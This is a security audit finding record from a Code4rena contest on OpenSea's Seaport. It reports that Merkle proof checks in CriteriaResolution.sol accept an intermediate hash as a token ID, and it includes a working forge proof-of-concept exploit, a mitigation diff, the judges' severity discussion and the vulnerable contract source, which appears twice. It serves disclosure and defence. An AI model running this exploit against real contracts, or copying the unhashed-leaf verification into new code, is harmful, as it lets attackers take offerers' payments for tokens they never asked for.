{
  "Title": "[M-01] Merkle Tree criteria can be resolved by wrong tokenIDs",
  "Content": "_Submitted by cmichel, also found by frangio and Spearbit_\n\n[CriteriaResolution.sol#L157](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157)<br>\n\nThe protocol allows specifying several tokenIds to accept for a single offer.<br>\nA merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item.<br>\nThe fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.<br>\n\nThere are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**.<br>\nIt's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.<br>\n\nThis leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.<br>\nUsually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.\n\n### Example\n\nAlice wants to buy either NFT with tokenId 1 or tokenId 2.<br>\nShe creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`.<br>\nShe creates an offer for this criteria.<br>\nAn attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.\n\n> One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.\n>\n> \"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'.\" [EIP721](https://eips.ethereum.org/EIPS/eip-721)\n>\n> Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.<br>\n> Therefore, ERC721-compliant token contracts are vulnerable to this attack.\n\n### Proof of Concept\n\nHere's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in *Example*.\n\n```solidity\ncontract BugMerkleTree is BaseOrderTest {\n    struct Context {\n        ConsiderationInterface consideration;\n        bytes32 tokenCriteria;\n        uint256 paymentAmount;\n        address zone;\n        bytes32 zoneHash;\n        uint256 salt;\n    }\n\n    function hashHashes(bytes32 hash1, bytes32 hash2)\n        internal\n        returns (bytes32)\n    {\n        // see MerkleProof.verify\n        bytes memory encoding;\n        if (hash1 <= hash2) {\n            encoding = abi.encodePacked(hash1, hash2);\n        } else {\n            encoding = abi.encodePacked(hash2, hash1);\n        }\n        return keccak256(encoding);\n    }\n\n    function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {\n        // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree\n        bytes32 leafLeft = bytes32(uint256(1));\n        bytes32 leafRight = bytes32(uint256(2));\n        bytes32 merkleRoot = hashHashes(leafLeft, leafRight);\n        console.logBytes32(merkleRoot);\n\n        Context memory context = Context(\n            consideration,\n            merkleRoot, /* tokenCriteria */\n            1e18, /* paymentAmount */\n            address(0), /* zone */\n            bytes32(0), /* zoneHash */\n            uint256(0) /* salt */\n        );\n        bytes32 conduitKey = bytes32(0);\n\n        token1.mint(address(alice), context.paymentAmount);\n        // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable\n        // we acquire the merkle root ID\n        test721_1.mint(address(this), uint256(merkleRoot));\n\n        _configureERC20OfferItem(\n            // start, end\n            context.paymentAmount, context.paymentAmount\n        );\n        _configureConsiderationItem(\n            ItemType.ERC721_WITH_CRITERIA,\n            address(test721_1),\n            // @audit set merkle root for NFTs we want to accept\n            uint256(context.tokenCriteria), /* identifierOrCriteria */\n            1,\n            1,\n            alice\n        );\n\n        OrderParameters memory orderParameters = OrderParameters(\n            address(alice),\n            context.zone,\n            offerItems,\n            considerationItems,\n            OrderType.FULL_OPEN,\n            block.timestamp,\n            block.timestamp + 1000,\n            context.zoneHash,\n            context.salt,\n            conduitKey,\n            considerationItems.length\n        );\n\n        OrderComponents memory orderComponents = getOrderComponents(\n            orderParameters,\n            context.consideration.getNonce(alice)\n        );\n        bytes32 orderHash = context.consideration.getOrderHash(orderComponents);\n        bytes memory signature = signOrder(\n            context.consideration,\n            alicePk,\n            orderHash\n        );\n\n        delete offerItems;\n        delete considerationItems;\n\n        /*************** ATTACK STARTS HERE ***************/\n        AdvancedOrder memory advancedOrder = AdvancedOrder(\n            orderParameters,\n            1, /* numerator */\n            1, /* denominator */\n            signature,\n            \"\"\n        );\n\n        // resolve the merkle root token ID itself\n        CriteriaResolver[] memory cr = new CriteriaResolver[](1);\n        bytes32[] memory proof = new bytes32[](0);\n        cr[0] = CriteriaResolver(\n              0, // uint256 orderIndex;\n              Side.CONSIDERATION, // Side side;\n              0, // uint256 index; (item)\n              uint256(merkleRoot), // uint256 identifier;\n              proof // bytes32[] criteriaProof;\n        );\n\n        uint256 profit = token1.balanceOf(address(this));\n        context.consideration.fulfillAdvancedOrder{\n            value: context.paymentAmount\n        }(advancedOrder, cr, bytes32(0));\n        profit = token1.balanceOf(address(this)) - profit;\n\n        // @audit could fulfill order without owning NFT 1 or 2\n        assertEq(profit, context.paymentAmount);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nUsually, this is fixed by using a type-byte that indicates if one is computing the hash for a *leaf* or not.<br>\nAn elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)<br>\nThen compute the leaf hash in the contract from the provided tokenId:\n\n```diff\nfunction _verifyProof(\n    uint256 leaf,\n    uint256 root,\n    bytes32[] memory proof\n) internal pure {\n    bool isValid;\n\n-    assembly {\n-        let computedHash := leaf\n+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))\n  ...\n```\n\nThere can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.\n\nNote that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)\n\n**[0age (OpenSea) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)**\n\n**[HardlyDifficult (judge) decreased severity to Medium](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168#issuecomment-1163507934):**\n > The attack outlined by the warden showcases how an intermediate node of a proof can be used as leaves, potentially allowing the attacker to resolve the merkle tree to a different `tokenId`. I think in the majority of cases, this will not allow users to trade on invalid `tokenIds`, however, considering the `ERC721` specification does not enforce a standard for how NFTs are represented using `tokenIds`, the issue has some legitimacy. Because of this, I believe `medium` severity to be justified.\n\n**[0age (OpenSea) resolved](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168):**\n > PR: [ProjectOpenSea/seaport#316](https://github.com/ProjectOpenSea/seaport/pull/316)\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-05-opensea-seaport-contest",
  "Code": [
    {
      "filename": "contracts/lib/CriteriaResolution.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport { ItemType, Side } from \"./ConsiderationEnums.sol\";\n\n// prettier-ignore\nimport {\n    OfferItem,\n    ConsiderationItem,\n    OrderParameters,\n    AdvancedOrder,\n    CriteriaResolver\n} from \"./ConsiderationStructs.sol\";\n\nimport \"./ConsiderationConstants.sol\";\n\n// prettier-ignore\nimport {\n    CriteriaResolutionErrors\n} from \"../interfaces/CriteriaResolutionErrors.sol\";\n\n/**\n * @title CriteriaResolution\n * @author 0age\n * @notice CriteriaResolution contains a collection of pure functions related to\n *         resolving criteria-based items.\n */\ncontract CriteriaResolution is CriteriaResolutionErrors {\n    /**\n     * @dev Internal pure function to apply criteria resolvers containing\n     *      specific token identifiers and associated proofs to order items.\n     *\n     * @param advancedOrders     The orders to apply criteria resolvers to.\n     * @param criteriaResolvers  An array where each element contains a\n     *                           reference to a specific order as well as that\n     *                           order's offer or consideration, a token\n     *                           identifier, and a proof that the supplied token\n     *                           identifier is contained in the order's merkle\n     *                           root. Note that a root of zero indicates that\n     *                           any transferrable token identifier is valid and\n     *                           that no proof needs to be supplied.\n     */\n    function _applyCriteriaResolvers(\n        AdvancedOrder[] memory advancedOrders,\n        CriteriaResolver[] memory criteriaResolvers\n    ) internal pure {\n        // Skip overflow checks as all for loops are indexed starting at zero.\n        unchecked {\n            // Retrieve length of criteria resolvers array and place on stack.\n            uint256 totalCriteriaResolvers = criteriaResolvers.length;\n\n            // Retrieve length of orders array and place on stack.\n            uint256 totalAdvancedOrders = advancedOrders.length;\n\n            // Iterate over each criteria resolver.\n            for (uint256 i = 0; i < totalCriteriaResolvers; ++i) {\n                // Retrieve the criteria resolver.\n                CriteriaResolver memory criteriaResolver = (\n                    criteriaResolvers[i]\n                );\n\n                // Read the order index from memory and place it on the stack.\n                uint256 orderIndex = criteriaResolver.orderIndex;\n\n                // Ensure that the order index is in range.\n                if (orderIndex >= totalAdvancedOrders) {\n                    revert OrderCriteriaResolverOutOfRange();\n                }\n\n                // Skip criteria resolution for order if not fulfilled.\n                if (advancedOrders[orderIndex].numerator == 0) {\n                    continue;\n                }\n\n                // Retrieve the parameters for the order.\n                OrderParameters memory orderParameters = (\n                    advancedOrders[orderIndex].parameters\n                );\n\n                // Read component index from memory and place it on the stack.\n                uint256 componentIndex = criteriaResolver.index;\n\n                // Declare values for item's type and criteria.\n                ItemType itemType;\n                uint256 identifierOrCriteria;\n\n                // If the criteria resolver refers to an offer item...\n                if (criteriaResolver.side == Side.OFFER) {\n                    // Retrieve the offer.\n                    OfferItem[] memory offer = orderParameters.offer;\n\n                    // Ensure that the component index is in range.\n                    if (componentIndex >= offer.length) {\n                        revert OfferCriteriaResolverOutOfRange();\n                    }\n\n                    // Retrieve relevant item using the component index.\n                    OfferItem memory offerItem = offer[componentIndex];\n\n                    // Read item type and criteria from memory & place on stack.\n                    itemType = offerItem.itemType;\n                    identifierOrCriteria = offerItem.identifierOrCriteria;\n\n                    // Optimistically update item type to remove criteria usage.\n                    ItemType newItemType;\n                    assembly {\n                        newItemType := sub(3, eq(itemType, 4))\n                    }\n                    offerItem.itemType = newItemType;\n\n                    // Optimistically update identifier w/ supplied identifier.\n                    offerItem.identifierOrCriteria = criteriaResolver\n                        .identifier;\n                } else {\n                    // Otherwise, the resolver refers to a consideration item.\n                    ConsiderationItem[] memory consideration = (\n                        orderParameters.consideration\n                    );\n\n                    // Ensure that the component index is in range.\n                    if (componentIndex >= consideration.length) {\n                        revert ConsiderationCriteriaResolverOutOfRange();\n                    }\n\n                    // Retrieve relevant item using order and component index.\n                    ConsiderationItem memory considerationItem = (\n                        consideration[componentIndex]\n                    );\n\n                    // Read item type and criteria from memory & place on stack.\n                    itemType = considerationItem.itemType;\n                    identifierOrCriteria = (\n                        considerationItem.identifierOrCriteria\n                    );\n\n                    // Optimistically update item type to remove criteria usage.\n                    ItemType newItemType;\n                    assembly {\n                        newItemType := sub(3, eq(itemType, 4))\n                    }\n                    considerationItem.itemType = newItemType;\n\n                    // Optimistically update identifier w/ supplied identifier.\n                    considerationItem.identifierOrCriteria = (\n                        criteriaResolver.identifier\n                    );\n                }\n\n                // Ensure the specified item type indicates criteria usage.\n                if (!_isItemWithCriteria(itemType)) {\n                    revert CriteriaNotEnabledForItem();\n                }\n\n                // If criteria is not 0 (i.e. a collection-wide offer)...\n                if (identifierOrCriteria != uint256(0)) {\n                    // Verify identifier inclusion in criteria root using proof.\n                    _verifyProof(\n                        criteriaResolver.identifier,\n                        identifierOrCriteria,\n                        criteriaResolver.criteriaProof\n                    );\n                }\n            }\n\n            // Iterate over each advanced order.\n            for (uint256 i = 0; i < totalAdvancedOrders; ++i) {\n                // Retrieve the advanced order.\n                AdvancedOrder memory advancedOrder = advancedOrders[i];\n\n                // Skip criteria resolution for order if not fulfilled.\n                if (advancedOrder.numerator == 0) {\n                    continue;\n                }\n\n                // Retrieve the parameters for the order.\n                OrderParameters memory orderParameters = (\n                    advancedOrders[i].parameters\n                );\n\n                // Read consideration length from memory and place on stack.\n                uint256 totalItems = orderParameters.consideration.length;\n\n                // Iterate over each consideration item on the order.\n                for (uint256 j = 0; j < totalItems; ++j) {\n                    // Ensure item type no longer indicates criteria usage.\n                    if (\n                        _isItemWithCriteria(\n                            orderParameters.consideration[j].itemType\n                        )\n                    ) {\n                        revert UnresolvedConsiderationCriteria();\n                    }\n                }\n\n                // Read offer length from memory and place on stack.\n                totalItems = orderParameters.offer.length;\n\n                // Iterate over each offer item on the order.\n                for (uint256 j = 0; j < totalItems; ++j) {\n                    // Ensure item type no longer indicates criteria usage.\n                    if (\n                        _isItemWithCriteria(orderParameters.offer[j].itemType)\n                    ) {\n                        revert UnresolvedOfferCriteria();\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * @dev Internal pure function to check whether a given item type represents\n     *      a criteria-based ERC721 or ERC1155 item (e.g. an item that can be\n     *      resolved to one of a number of different identifiers at the time of\n     *      order fulfillment).\n     *\n     * @param itemType The item type in question.\n     *\n     * @return withCriteria A boolean indicating that the item type in question\n     *                      represents a criteria-based item.\n     */\n    function _isItemWithCriteria(ItemType itemType)\n        internal\n        pure\n        returns (bool withCriteria)\n    {\n        // ERC721WithCriteria is ItemType 4. ERC1155WithCriteria is ItemType 5.\n        assembly {\n            withCriteria := gt(itemType, 3)\n        }\n    }\n\n    /**\n     * @dev Internal pure function to ensure that a given element is contained\n     *      in a merkle root via a supplied proof.\n     *\n     * @param leaf  The element for which to prove inclusion.\n     * @param root  The merkle root that inclusion will be proved against.\n     * @param proof The merkle proof.\n     */\n    function _verifyProof(\n        uint256 leaf,\n        uint256 root,\n        bytes32[] memory proof\n    ) internal pure {\n        bool isValid;\n\n        assembly {\n            // Start the hash off as just the starting leaf.\n            let computedHash := leaf\n\n            // Get memory start location of the first element in proof array.\n            let data := add(proof, OneWord)\n\n            // Iterate over proof elements to compute root hash.\n            for {\n                let end := add(data, mul(mload(proof), OneWord))\n            } lt(data, end) {\n                data := add(data, OneWord)\n            } {\n                // Get the proof element.\n                let loadedData := mload(data)\n\n                // Sort and store proof element and hash.\n                switch gt(computedHash, loadedData)\n                case 0 {\n                    mstore(0, computedHash) // Place existing hash first.\n                    mstore(0x20, loadedData) // Place new hash next.\n                }\n                default {\n                    mstore(0, loadedData) // Place new hash first.\n                    mstore(0x20, computedHash) // Place existing hash next.\n                }\n\n                // Derive the updated hash.\n                computedHash := keccak256(0, TwoWords)\n            }\n\n            // Compare the final hash to the supplied root.\n            isValid := eq(computedHash, root)\n        }\n\n        // Revert if computed hash does not equal supplied root.\n        if (!isValid) {\n            revert InvalidProof();\n        }\n    }\n}"
    },
    {
      "filename": "contracts/lib/CriteriaResolution.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport { ItemType, Side } from \"./ConsiderationEnums.sol\";\n\n// prettier-ignore\nimport {\n    OfferItem,\n    ConsiderationItem,\n    OrderParameters,\n    AdvancedOrder,\n    CriteriaResolver\n} from \"./ConsiderationStructs.sol\";\n\nimport \"./ConsiderationConstants.sol\";\n\n// prettier-ignore\nimport {\n    CriteriaResolutionErrors\n} from \"../interfaces/CriteriaResolutionErrors.sol\";\n\n/**\n * @title CriteriaResolution\n * @author 0age\n * @notice CriteriaResolution contains a collection of pure functions related to\n *         resolving criteria-based items.\n */\ncontract CriteriaResolution is CriteriaResolutionErrors {\n    /**\n     * @dev Internal pure function to apply criteria resolvers containing\n     *      specific token identifiers and associated proofs to order items.\n     *\n     * @param advancedOrders     The orders to apply criteria resolvers to.\n     * @param criteriaResolvers  An array where each element contains a\n     *                           reference to a specific order as well as that\n     *                           order's offer or consideration, a token\n     *                           identifier, and a proof that the supplied token\n     *                           identifier is contained in the order's merkle\n     *                           root. Note that a root of zero indicates that\n     *                           any transferrable token identifier is valid and\n     *                           that no proof needs to be supplied.\n     */\n    function _applyCriteriaResolvers(\n        AdvancedOrder[] memory advancedOrders,\n        CriteriaResolver[] memory criteriaResolvers\n    ) internal pure {\n        // Skip overflow checks as all for loops are indexed starting at zero.\n        unchecked {\n            // Retrieve length of criteria resolvers array and place on stack.\n            uint256 totalCriteriaResolvers = criteriaResolvers.length;\n\n            // Retrieve length of orders array and place on stack.\n            uint256 totalAdvancedOrders = advancedOrders.length;\n\n            // Iterate over each criteria resolver.\n            for (uint256 i = 0; i < totalCriteriaResolvers; ++i) {\n                // Retrieve the criteria resolver.\n                CriteriaResolver memory criteriaResolver = (\n                    criteriaResolvers[i]\n                );\n\n                // Read the order index from memory and place it on the stack.\n                uint256 orderIndex = criteriaResolver.orderIndex;\n\n                // Ensure that the order index is in range.\n                if (orderIndex >= totalAdvancedOrders) {\n                    revert OrderCriteriaResolverOutOfRange();\n                }\n\n                // Skip criteria resolution for order if not fulfilled.\n                if (advancedOrders[orderIndex].numerator == 0) {\n                    continue;\n                }\n\n                // Retrieve the parameters for the order.\n                OrderParameters memory orderParameters = (\n                    advancedOrders[orderIndex].parameters\n                );\n\n                // Read component index from memory and place it on the stack.\n                uint256 componentIndex = criteriaResolver.index;\n\n                // Declare values for item's type and criteria.\n                ItemType itemType;\n                uint256 identifierOrCriteria;\n\n                // If the criteria resolver refers to an offer item...\n                if (criteriaResolver.side == Side.OFFER) {\n                    // Retrieve the offer.\n                    OfferItem[] memory offer = orderParameters.offer;\n\n                    // Ensure that the component index is in range.\n                    if (componentIndex >= offer.length) {\n                        revert OfferCriteriaResolverOutOfRange();\n                    }\n\n                    // Retrieve relevant item using the component index.\n                    OfferItem memory offerItem = offer[componentIndex];\n\n                    // Read item type and criteria from memory & place on stack.\n                    itemType = offerItem.itemType;\n                    identifierOrCriteria = offerItem.identifierOrCriteria;\n\n                    // Optimistically update item type to remove criteria usage.\n                    ItemType newItemType;\n                    assembly {\n                        newItemType := sub(3, eq(itemType, 4))\n                    }\n                    offerItem.itemType = newItemType;\n\n                    // Optimistically update identifier w/ supplied identifier.\n                    offerItem.identifierOrCriteria = criteriaResolver\n                        .identifier;\n                } else {\n                    // Otherwise, the resolver refers to a consideration item.\n                    ConsiderationItem[] memory consideration = (\n                        orderParameters.consideration\n                    );\n\n                    // Ensure that the component index is in range.\n                    if (componentIndex >= consideration.length) {\n                        revert ConsiderationCriteriaResolverOutOfRange();\n                    }\n\n                    // Retrieve relevant item using order and component index.\n                    ConsiderationItem memory considerationItem = (\n                        consideration[componentIndex]\n                    );\n\n                    // Read item type and criteria from memory & place on stack.\n                    itemType = considerationItem.itemType;\n                    identifierOrCriteria = (\n                        considerationItem.identifierOrCriteria\n                    );\n\n                    // Optimistically update item type to remove criteria usage.\n                    ItemType newItemType;\n                    assembly {\n                        newItemType := sub(3, eq(itemType, 4))\n                    }\n                    considerationItem.itemType = newItemType;\n\n                    // Optimistically update identifier w/ supplied identifier.\n                    considerationItem.identifierOrCriteria = (\n                        criteriaResolver.identifier\n                    );\n                }\n\n                // Ensure the specified item type indicates criteria usage.\n                if (!_isItemWithCriteria(itemType)) {\n                    revert CriteriaNotEnabledForItem();\n                }\n\n                // If criteria is not 0 (i.e. a collection-wide offer)...\n                if (identifierOrCriteria != uint256(0)) {\n                    // Verify identifier inclusion in criteria root using proof.\n                    _verifyProof(\n                        criteriaResolver.identifier,\n                        identifierOrCriteria,\n                        criteriaResolver.criteriaProof\n                    );\n                }\n            }\n\n            // Iterate over each advanced order.\n            for (uint256 i = 0; i < totalAdvancedOrders; ++i) {\n                // Retrieve the advanced order.\n                AdvancedOrder memory advancedOrder = advancedOrders[i];\n\n                // Skip criteria resolution for order if not fulfilled.\n                if (advancedOrder.numerator == 0) {\n                    continue;\n                }\n\n                // Retrieve the parameters for the order.\n                OrderParameters memory orderParameters = (\n                    advancedOrders[i].parameters\n                );\n\n                // Read consideration length from memory and place on stack.\n                uint256 totalItems = orderParameters.consideration.length;\n\n                // Iterate over each consideration item on the order.\n                for (uint256 j = 0; j < totalItems; ++j) {\n                    // Ensure item type no longer indicates criteria usage.\n                    if (\n                        _isItemWithCriteria(\n                            orderParameters.consideration[j].itemType\n                        )\n                    ) {\n                        revert UnresolvedConsiderationCriteria();\n                    }\n                }\n\n                // Read offer length from memory and place on stack.\n                totalItems = orderParameters.offer.length;\n\n                // Iterate over each offer item on the order.\n                for (uint256 j = 0; j < totalItems; ++j) {\n                    // Ensure item type no longer indicates criteria usage.\n                    if (\n                        _isItemWithCriteria(orderParameters.offer[j].itemType)\n                    ) {\n                        revert UnresolvedOfferCriteria();\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * @dev Internal pure function to check whether a given item type represents\n     *      a criteria-based ERC721 or ERC1155 item (e.g. an item that can be\n     *      resolved to one of a number of different identifiers at the time of\n     *      order fulfillment).\n     *\n     * @param itemType The item type in question.\n     *\n     * @return withCriteria A boolean indicating that the item type in question\n     *                      represents a criteria-based item.\n     */\n    function _isItemWithCriteria(ItemType itemType)\n        internal\n        pure\n        returns (bool withCriteria)\n    {\n        // ERC721WithCriteria is ItemType 4. ERC1155WithCriteria is ItemType 5.\n        assembly {\n            withCriteria := gt(itemType, 3)\n        }\n    }\n\n    /**\n     * @dev Internal pure function to ensure that a given element is contained\n     *      in a merkle root via a supplied proof.\n     *\n     * @param leaf  The element for which to prove inclusion.\n     * @param root  The merkle root that inclusion will be proved against.\n     * @param proof The merkle proof.\n     */\n    function _verifyProof(\n        uint256 leaf,\n        uint256 root,\n        bytes32[] memory proof\n    ) internal pure {\n        bool isValid;\n\n        assembly {\n            // Start the hash off as just the starting leaf.\n            let computedHash := leaf\n\n            // Get memory start location of the first element in proof array.\n            let data := add(proof, OneWord)\n\n            // Iterate over proof elements to compute root hash.\n            for {\n                let end := add(data, mul(mload(proof), OneWord))\n            } lt(data, end) {\n                data := add(data, OneWord)\n            } {\n                // Get the proof element.\n                let loadedData := mload(data)\n\n                // Sort and store proof element and hash.\n                switch gt(computedHash, loadedData)\n                case 0 {\n                    mstore(0, computedHash) // Place existing hash first.\n                    mstore(0x20, loadedData) // Place new hash next.\n                }\n                default {\n                    mstore(0, loadedData) // Place new hash first.\n                    mstore(0x20, computedHash) // Place existing hash next.\n                }\n\n                // Derive the updated hash.\n                computedHash := keccak256(0, TwoWords)\n            }\n\n            // Compare the final hash to the supplied root.\n            isValid := eq(computedHash, root)\n        }\n\n        // Revert if computed hash does not equal supplied root.\n        if (!isValid) {\n            revert InvalidProof();\n        }\n    }\n}"
    }
  ]
}